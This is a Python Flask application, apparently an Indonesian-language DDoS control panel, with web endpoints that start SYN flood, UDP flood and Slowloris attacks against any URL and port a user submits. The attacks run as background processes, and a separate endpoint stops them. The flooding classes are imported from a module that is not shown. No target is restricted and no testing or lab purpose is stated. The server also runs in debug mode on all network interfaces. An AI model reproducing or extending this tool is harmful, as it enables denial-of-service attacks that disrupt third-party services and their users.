from attack_script import SlowlorisAttack, UDPAttack, SYNFlood
from flask import Flask, render_template, request, jsonify
import signal 
import os 
import multiprocessing

app = Flask(__name__)

# inisiasi process dan pid
pid = None
p = None

# Create a shared lock
lock = multiprocessing.Lock()

# Menyiapkan function untuk menyerang
def run_attack_syn(syn):
    with lock:
        syn.attack()

def run_attack_udp(udp):
    with lock:
        udp.attack()

def run_attack_slowloris(slow):
    with lock:
        slow.attack()
    
# function untuk menjalankan tkinter enpoint
def startGUI():
    import DDOS_GUI

# Definisikan fungsi penangan sinyal
def signal_handler(signum, frame):
    os._exit(0)

# Daftarkan penangan sinyal untuk SIGINT
signal.signal(signal.SIGINT, signal_handler)

# create a list to store the processes & Pids
processes = []
pids = []

# Route to main page
@app.route("/")
def home():
    return render_template("main.html")

# Route to DOS Page
@app.route('/DOS_index')
def DOS_index():
    return render_template("DOS_index.html")

# Route API
@app.route("/startGUI", methods=["POST"])
def startGUI_endpoint():
    try:
        startGUI()
        return jsonify('GUI Has Started Succesfully')
    except Exception as e:
        return jsonify(f'{e}')

@app.route("/loopattackstop", methods=['POST'])
def loopattackstop():
    try:
        data = request.get_data().decode('utf-8')
        if data == "stop":
            lock.acquire()  # Acquire the lock before terminating the processes
            for proc in processes[:]:
                # nonaktifkan proses yang hidup di memori
                if proc.is_alive():
                    proc.terminate()
                    proc.join()
                processes.remove(proc)
            lock.release()  # Release the lock after termination
            for pid in pids[:]:
                if pid > 0:
                    try:
                        os.kill(pid, signal.SIGINT)
                    except ProcessLookupError:
                        pass
                pids.remove(pid)
            return jsonify('Serangan DDOS telah berhenti menyerang')
    except Exception as e:
        return jsonify(f'{e}')

@app.route("/loop", methods=["POST"])
def loop(): 
    # mendapatkan data dari javascript 
    data = request.get_json()
    tipe_serangan = str(data['type'])
    
    if tipe_serangan == 'syn':
        try:
            url = data['url']
            url_str = str(url)
            port = data['port']
            port_int = int(port)
            attackDuration = data['attackduration']
            attackDuration_int = int(attackDuration)
            syn = SYNFlood(url, port_int, attackDuration_int)
            
            p = multiprocessing.Process(target=run_attack_syn, args=(syn,))
            p.start() # Menjalankan process baru
            
            # Protect the processes and pids lists with the lock
            lock.acquire()
            processes.append(p)
            pids.append(p.pid)
            lock.release()
            
            response = f'SYN FLOOD Sedang menyerang ... {url_str} dengan port {port_int}'
            return jsonify(response)
        except Exception as e:
            return jsonify(f'{e}')
        
    elif tipe_serangan == 'udp':
        try:
            url = data['url']
            url_str = str(url)
            port = data['port']
            port_int = int(port)
            timePause = data['timepause']
            timePause_int = float(timePause)
            attackDuration = data['attackduration']
            attackDuration_int = int(attackDuration)
            udp = UDPAttack(url, port_int, timePause_int, attackDuration_int)
            
            p = multiprocessing.Process(target=run_attack_udp, args=(udp,))
            p.start() # Menjalankan process baru
            
            # Protect the processes and pids lists with the lock
            lock.acquire()
            processes.append(p)
            pids.append(p.pid)
            lock.release()
            
            response = f'UDP FLOOD Sedang menyerang ... {url_str} dengan port {port_int} tiap {timePause_int} detik'
            return jsonify(response)
        except Exception as e:
            return jsonify(f'{e}')
        
        
    elif tipe_serangan == 'slowloris':
        try:
            url = data['url']
            url_str = str(url)
            port = data['port']
            port_int = int(port)
            attackDuration = data['attackduration']
            attackDuration_int = int(attackDuration)
            totalRequest = data['totalrequest']
            totalRequest_int = int(totalRequest)
            slow = SlowlorisAttack(url, port_int, totalRequest_int, attackDuration_int)
            
            p = multiprocessing.Process(target=run_attack_slowloris, args=(slow,))
            p.start() # Menjalankan process baru
            
            # Protect the processes and pids lists with the lock
            lock.acquire()
            processes.append(p)
            pids.append(p.pid)
            lock.release()
            
            response = f'SLOWLORIS Sedang menyerang ... {url_str} dengan port {port_int} Total Serangan sebanyak {totalRequest_int} Dengan Durasi: {attackDuration_int} detik'
            return jsonify(response)
        except Exception as e:
            return jsonify(f'{e}')
        
    else:
        return jsonify(f"message : invalid attack type")

if __name__=="__main__":    
    app.run(host="0.0.0.0", port=5000 ,debug=True)

